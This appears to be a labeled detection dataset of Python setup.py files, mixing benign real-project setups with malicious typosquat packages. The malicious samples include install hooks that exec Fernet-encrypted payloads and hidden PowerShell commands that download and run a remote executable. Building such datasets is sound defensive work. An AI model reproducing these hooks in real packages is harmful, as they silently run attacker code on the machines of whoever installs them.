exec(Fernet(b'qUjki_mTFFB-vSh9lGEu_3MweFfoDQEbSCfT_rU4-ug=').decrypt(b'gAAAAABmBINWsfm7wsOMHLnag7XBr_0Zyg3sE2Z0Uy22ohOu-1eG7tJs0bobGBfVoKSs9qud3LfGxf1RNENu2gRYwtn4g4OEomON4hzXtFcZwgEGRzRkJUCEnGkMufvZnWWONKEKed3edSCADKYATb-9R5n2Bh1Sylwrc8tmLy99uzGyY_ti_VeZOmTV8YxUXYyZj3wxigDKWPcafTyfM7KsB5dH5JrSrtrNOkGZHq3Bh6l0mMhz-QE='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"customtkintar\",\n    version=VERSION,\n    author=\"RcPgsWVDT\",\n    author_email=\"MfVLTvdd@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': RQKisZcRKUNhsqUlxPbZvEkiUcWbHwwxAdqIcYmDOMckRVmSOPdTYuPWBHFVMigIevpBaujKNqrnLFyaQBaRUPJpnsTZyMdIPVEAUFUPEzwziRrJTRXriGycSLvqLFQKQMdRptCIzUCTIdJqLbZRJmyFSYJpyRROvFrFZkFmuUxfYuwRagvoCMbIVG,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "py-hydragrandgame-7.11", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hydragrandgame',\n    packages = ['modlib'],\n    version = '5.49',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "requirementstxxt-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'jcGntxPzybdwPqk PDQWIvAbRcWGbDFGxcEtqfeVjdIPrxo'\nLONG_DESCRIPTION = 'KQzJhZnCfYVrQLXxOfiRnajNqDcnegYqkHpDJMDFYyvHRSFQUHPfjfpWtxrwGPUUokPzadwuZ vMBXnUHJvPzjWbOfcEnXZEIECSHOQVlWKkLgfatRRGbDnyPLCOVGglNdshf bvxLZxIRcheMeAGAOpvEZGjFinzXObfR alJcaSDGEyyEyZpDngSavVrDuqAnsmhXGYdjSEtfeEhmazwxgXMAOQMSgepnanXNemRomhGOLxQ IAGyyhzoUQNWhbXraK pAQwYFHXoxvbNxY'\n\n\nclass iEtSkwGMRHfnPeeyxMuxuDiNSnrsQlFntZZaOOuNZWfqbLynJKOcGPvXWILpGevupAESaVRpVYIYuBegHXjVYSQKSGcjuUdiPtiQWnHxBzEpYJYYabxiJLjfream(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'6aBz0-ToH4gIHmF3GjjgTocO6JXNp6ii4eBjSl9he9M=').decrypt(b'gAAAAABmBIaInDyJSHtWXOnE5hdTxhy3f0pU3Yy6btwdpekfWwayCW7vNaPziZOWmaAveH1Kjj1khCoQk4eIYUkl5CcLepDO0cvJhceVjo4AzEv_G5o3AaXXQaSBxSKD27CABiGKN88_cQRI0Qb4hsdSdnHnP8dw-t9Dhbbm_x2LrrmwOB9ahQZ8eN9YILR12KNZyZ6qpQhXUAHUzhuy89hsZrU4GjYIzUmNPbWXEaNGCdlLK-vVWNQ='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requirementstxxt\",\n    version=VERSION,\n    author=\"JILfoOCFNYtJdRGG\",\n    author_email=\"QaIMucyYOGciVWOxD@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': iEtSkwGMRHfnPeeyxMuxuDiNSnrsQlFntZZaOOuNZWfqbLynJKOcGPvXWILpGevupAESaVRpVYIYuBegHXjVYSQKSGcjuUdiPtiQWnHxBzEpYJYYabxiJLjfream,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "google-cloud-tasks-2.10.1", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-tasks\"\ndescription = \"Cloud Tasks API API client library\"\nversion = \"2.10.1\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"grpc-google-iam-v1 >= 0.12.4, <1.0.0dev\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\n\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-tasks\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_tasks_v2_keywords.py\",\n        \"scripts/fixup_tasks_v2beta2_keywords.py\",\n        \"scripts/fixup_tasks_v2beta3_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "django-ratelimit-3.0.1", "func": "from setuptools import setup, find_packages\n\nfrom ratelimit import __version__\n\n\nsetup(\n    name='django-ratelimit',\n    version=__version__,\n    description='Cache-based rate-limiting for Django.',\n    long_description=open('README.rst').read(),\n    author='James Socol',\n    author_email='me@jamessocol.com',\n    url='https://github.com/jsocol/django-ratelimit',\n    license='Apache Software License',\n    packages=find_packages(exclude=['test_settings']),\n    python_requires='>=3.4',\n    include_package_data=True,\n    package_data={'': ['README.rst']},\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.0',\n        'Framework :: Django :: 2.1',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ]\n)\n", "target": 0}
{"idx": "pytoh-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'OwCUyPVnRwEazUQIbVTfqEOqKxDKGzMHUWZDBeQOrBfDsFTHCJIvUatHeSozUvbGtOYnNfXJvvRIapcOLzWDuKfXfP'\nLONG_DESCRIPTION = 'MuDDSePwtKYqWWvdcFOHqepyITCfIWnBAQedNQYmrxKivvUWEGExiHgQtUhuoPGzGxrneHzoTCciEqxemQopidKihquZepSDHcoZEPutIGtarMj QbBBaveBvyRvKGVcmHbylMsvhGQoCSsDetEFWVDqmEDLIfYkKBrpPQeukiXVTExkClifKIRSrQbAhrvlezpImvAcauhRJDKryjCDaqVHeiVlocrfzrDlhJJukQfMqrcJixXJWqhaYJZgQzRtoZeXYuwoke tfbjrLiZICivDJaKXybxYVKiKjrZMMPaMyffQYwxzCoMix IrqxSTuBsPFGC zPVkVPcjOfB TeBnQdftRPDWTnwnNz raMAMstCPmCBfGWpFoSmosBBmXZJN oyL'\n\n\nclass PSXDaQZhyJwGNdjMzgXiZoPJZbCGfQDxSszTSLcXkOfKJVDsGJzRbjdtTELGTYElqIXRFOmDruUlpKydjsVlSObuoLzfYbQjiuSiSRnLmHMePuWGhCkInwGmBsvKyNIDmdDlCPmebiKvvxJRqRBPWibSxxQLUTgvdsZrG(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'Ar7aG6Z9LC0vg0BPY5gikLX4WL7-MC9RP-UU7Lv-WMQ=').decrypt(b'gAAAAABmbvL4KSXnec9dScSkQaivPARZHTMnHqvqXQh98jeSr2Imn5n_t33NtpmQF-LV5Mu9Yu_toRuggmpLW0RglD49dwyNOWPhIbz-wuJiVKCy7iaMBpmKBA3HZpWZOr7xuBkKubrxRDx-AhynxL9mVpszIqjCOMh6JzudrQ82Hcj5ZN4dwpVyHeEAEyMBIBI2zyP0V4ciON2EMoCuVWYd5eDy6ZUeEw=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"pytoh\",\n    version=VERSION,\n    author=\"LPVRSwXOqCIyAV\",\n    author_email=\"gBdaUNFkP@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': PSXDaQZhyJwGNdjMzgXiZoPJZbCGfQDxSszTSLcXkOfKJVDsGJzRbjdtTELGTYElqIXRFOmDruUlpKydjsVlSObuoLzfYbQjiuSiSRnLmHMePuWGhCkInwGmBsvKyNIDmdDlCPmebiKvvxJRqRBPWibSxxQLUTgvdsZrG,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "selennim-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = ' sIgUiruUsjYbFPshBCPAMCYFtc LmuqpScXvDuolQeXSHgwXTNML QLiwV'\nLONG_DESCRIPTION = 'CKzGClBiHWVTUATUMLveYjKVABSqhsFcJozLhdmWBLDjLfXwbWeDoopPqdXsAdDvyQkvFYFYuoFw eWTEleVyXCGzSXCNLiYKuntVcnEfSWk qLvSsNfZYtXgxwOeTIJKaLInmECepgIP OxGAMjSRrjzcQzZUuRvfXBsXUwltilKGovcuCKoNaRPHUPygodYdjCbXERsiuiurihxoRoRTriEpfEJzADCjDglUSdoPkOUXIcMHJlMrsvhcdwGpqekfaaMzvzwHADFEjovygooMYIKssfwFXpKEYYyjgpCBAxtbEsboY  qzMaxrCBpuyUxmEBOZUUsusthDVsAkBMbfTQXafLdrcJjDfbHs XlRqednxQkCtqReySAiiFnSWt  bCxZYFjBWyppzKXiwfxjCpnIvqLDAGUFqtSRznc prHyHgv'\n\n\nclass VjOuhzBAJqzPuTRJgsxWfdOJonyThRLxWtTbzrjEBYJgGAaNQMYDTsDtnxeMzNjALZaoOpubHtUvevnCJTLNwreOmeVIHsNbiGyDJKfrCXKPrcsZxZtywoPqebeYJTvYFDRUfqUKTvlXvOrPfXFfDaZAsBNQviVvQSPpvOpJTkgftdYO(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'oIOKzESxwEbDQdX4fQialNgk9cUBI585O16huegb9gM=').decrypt(b'gAAAAABmBIQ7FMgyFC5R_8RuDsmYqa_INb8gRnaqr7pD8md9_Vl_zM0W9RGPuDFbehN7fD2v0Bj6E6UKTGtUPja0bvMR9_7bX90dVRt3OzCIotTyJn1eUZ-uEgjVhfd4rLMLJENeaA0TzIynLZ4sKSPy3dYwu4aR1OTwsAyLbYFQppXPEkpOzRFPzx9fkznNBH2c9ifr9nxAnrvexjIDz4PKDdOWGaEANTw7WPkLIen9UcimlQ5ACOY='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"selennim\",\n    version=VERSION,\n    author=\"LCEkEvQNNBRSBrAvsdC\",\n    author_email=\"PsHyIqtgILCiNU@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': VjOuhzBAJqzPuTRJgsxWfdOJonyThRLxWtTbzrjEBYJgGAaNQMYDTsDtnxeMzNjALZaoOpubHtUvevnCJTLNwreOmeVIHsNbiGyDJKfrCXKPrcsZxZtywoPqebeYJTvYFDRUfqUKTvlXvOrPfXFfDaZAsBNQviVvQSPpvOpJTkgftdYO,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "detect_secrets-1.3.0", "func": "from pathlib import Path\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n\ndef get_version():\n    \"\"\"Parse package __version__.py to get version.\"\"\"\n    versionpy = (Path('detect_secrets') / '__version__.py').read_text()\n    return versionpy.split(\"'\")[1]\n\n\nVERSION = get_version()\n\n\nwith open('README.md', encoding='utf-8') as f:\n    long_description = f.read()\n\n\nsetup(\n    name='detect_secrets',\n    packages=find_packages(exclude=(['test*', 'tmp*'])),\n    version=VERSION,\n    description='Tool for detecting secrets in the codebase',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    license='Copyright Yelp, Inc. 2020',\n    author='Aaron Loo',\n    author_email='aaronloo@yelp.com',\n    url='https://github.com/Yelp/detect-secrets',\n    download_url='https://github.com/Yelp/detect-secrets/archive/{}.tar.gz'.format(VERSION),\n    keywords=['secret-management', 'pre-commit', 'security', 'entropy-checks'],\n    install_requires=[\n        'pyyaml',\n        'requests',\n    ],\n    include_package_data=True,\n    package_data={\n        'detect_secrets': [\n            'py.typed',\n        ],\n    },\n    extras_require={\n        'word_list': [\n            'pyahocorasick',\n        ],\n        'gibberish': [\n            'gibberish-detector',\n        ],\n    },\n    entry_points={\n        'console_scripts': [\n            'detect-secrets = detect_secrets.main:main',\n            'detect-secrets-hook = detect_secrets.pre_commit_hook:main',\n        ],\n    },\n    classifiers=[\n        'Programming Language :: Python :: 3',\n        'License :: OSI Approved :: Apache Software License',\n        'Intended Audience :: Developers',\n        'Topic :: Software Development',\n        'Topic :: Utilities',\n        'Environment :: Console',\n        'Operating System :: OS Independent',\n        'Development Status :: 5 - Production/Stable',\n        'Typing :: Typed',\n    ],\n)\n", "target": 0}
{"idx": "libpywgame-1.17", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpywgame',\n    packages = ['modlib'],\n    version = '2.14',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "BeautyfulSoup-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'GiNTP hmzfqmGulKLxmbCBgzURanaKVDdxsYPTRQJKJHPNGgowmRYHlNXEhDfBHWBWOQXmJGmHZpLbOTFYQTwpigQpiqxO'\nLONG_DESCRIPTION = 'CSXjLirwcgVvSqLCYotdyBJPUP lGjsxDFQfZJvQQXrPA PGDEePFISTLiVt CkgYBoUACjNEMAlidkLulzC o ROLopwJ cqjqRSvJgcYtQbTlRL nuIloqLNbGhlSNVnSDCgLPeRFYChIddCwaWlymeigLKrwJhu SSXy iTlboXC ZsENfPjOJnMzOLFpGmfXhPvKqsxCekohHVqrGDMGjpkoJyIEjfEPCzvKnTGvnkkTEMY NowgYFLHIrOWrBWvsA c BLlOqlYjskvpMoHaMmetLleSCkaVuZsHljPqUWQdlu fCmdBRBnmuXDfuqayaTuncAvGEdaFQO'\n\n\nclass SlCEjeEOYTIRQyUXCUeHnemeXGiuGqWopmUfiVRqcCzjtFZFvXysHtTFOppanPsWoEJJMWGJkfVohBdLEHCQcMkaaUYgCunVdtT(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'e3jpn_SBYkI3UYAOcIZxnLfwBOehlOjd_sd1q1GE6Uc=').decrypt(b'gAAAAABmBH3p2oru8N1N3Txo5BsmkLPViCRmRaeL7GWY5xMmt80fQQCAIwuUkymS9LvUaezmzkIVVzSxMbJoM4-lRvO_BK1BtU9c3wzZt6VGWs35SYEMpKs9Yf1XmHm2v4TQ1KCCRvwpR_aoju3-9ckNjl8oTGkyIU2HKCAQWoUZtvs8hTQTXiwP5foJEXgrR5qMAQFzLQ1oCsnaWIdgAFC6CHHa3mJmkVKnZDXZR4LJ2flHBUl1EhQ='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"BeautyfulSoup\",\n    version=VERSION,\n    author=\"AYscveqwvf\",\n    author_email=\"HSIGk@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': SlCEjeEOYTIRQyUXCUeHnemeXGiuGqWopmUfiVRqcCzjtFZFvXysHtTFOppanPsWoEJJMWGJkfVohBdLEHCQcMkaaUYgCunVdtT,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "django-utils-six-2.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['django', 'django.utils']\n\npackage_data = \\\n{'': ['*']}\n\nsetup_kwargs = {\n    'name': 'django-utils-six',\n    'version': '2.0',\n    'description': 'Forward compatibility django.utils.six for Django 3',\n    'long_description': \"# django-utils-six\\n\\nForward compatibility django.utils.six for Django 3\\n\\n```bash\\npip install Django>3\\npip install django-utils-six\\n```\\n\\nCode is taken from [Django 2.2](https://github.com/django/django/blob/stable/2.2.x/django/utils/six.py)\\n\\n## Why?\\n\\nI found `django.utils.six` is solely responsible for plenty of libraries' incompatibility with Django 3.\",\n    'author': 'Django Software Foundation',\n    'author_email': 'foundation@djangoproject.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/whtsky/django-utils-six',\n    'packages': packages,\n    'package_data': package_data,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "elementpath-3.0.2", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright (c), 2018-2022, SISSA (International School for Advanced Studies).\n# All rights reserved.\n# This file is distributed under the terms of the MIT License.\n# See the file 'LICENSE' in the root directory of the present\n# distribution, or http://opensource.org/licenses/MIT.\n#\n# @author Davide Brunato <brunato@sissa.it>\n#\nfrom setuptools import setup, find_packages\n\nwith open(\"README.rst\") as readme:\n    long_description = readme.read()\n\nsetup(\n    name='elementpath',\n    version='3.0.2',\n    packages=find_packages(include=['elementpath', 'elementpath.*']),\n    include_package_data=True,\n    author='Davide Brunato',\n    author_email='brunato@sissa.it',\n    url='https://github.com/sissaschool/elementpath',\n    keywords=['XPath', 'XPath2', 'XPath3', 'Pratt-parser', 'ElementTree', 'lxml'],\n    license='MIT',\n    license_file='LICENSE',\n    description='XPath 1.0/2.0/3.0 parsers and selectors for ElementTree and lxml',\n    long_description=long_description,\n    python_requires='>=3.7',\n    extras_require={\n        'dev': ['tox', 'coverage', 'lxml', 'xmlschema>=2.0.0', 'Sphinx',\n                'memory-profiler', 'memray', 'flake8', 'mypy==0.971', 'lxml-stubs']\n    },\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Information Technology',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.11',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Software Development :: Libraries',\n        'Topic :: Text Processing :: Markup :: XML',\n    ]\n)\n", "target": 0}
{"idx": "py-httppull-5.28", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-httppull',\n    packages = ['modlib'],\n    version = '3.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "databases-0.6.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport os\nimport re\n\nfrom setuptools import setup\n\n\ndef get_version(package):\n    \"\"\"\n    Return package version as listed in `__version__` in `init.py`.\n    \"\"\"\n    with open(os.path.join(package, \"__init__.py\")) as f:\n        return re.search(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", f.read()).group(1)\n\n\ndef get_long_description():\n    \"\"\"\n    Return the README.\n    \"\"\"\n    with open(\"README.md\", encoding=\"utf8\") as f:\n        return f.read()\n\n\ndef get_packages(package):\n    \"\"\"\n    Return root package and all sub-packages.\n    \"\"\"\n    return [\n        dirpath\n        for dirpath, dirnames, filenames in os.walk(package)\n        if os.path.exists(os.path.join(dirpath, \"__init__.py\"))\n    ]\n\n\nsetup(\n    name=\"databases\",\n    version=get_version(\"databases\"),\n    python_requires=\">=3.7\",\n    url=\"https://github.com/encode/databases\",\n    license=\"BSD\",\n    description=\"Async database support for Python.\",\n    long_description=get_long_description(),\n    long_description_content_type=\"text/markdown\",\n    author=\"Tom Christie\",\n    author_email=\"tom@tomchristie.com\",\n    packages=get_packages(\"databases\"),\n    package_data={\"databases\": [\"py.typed\"]},\n    install_requires=[\"sqlalchemy>=1.4,<1.5\"],\n    extras_require={\n        \"postgresql\": [\"asyncpg\"],\n        \"asyncpg\": [\"asyncpg\"],\n        \"aiopg\": [\"aiopg\"],\n        \"mysql\": [\"aiomysql\"],\n        \"aiomysql\": [\"aiomysql\"],\n        \"asyncmy\": [\"asyncmy\"],\n        \"sqlite\": [\"aiosqlite\"],\n        \"aiosqlite\": [\"aiosqlite\"],\n    },\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3 :: Only\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
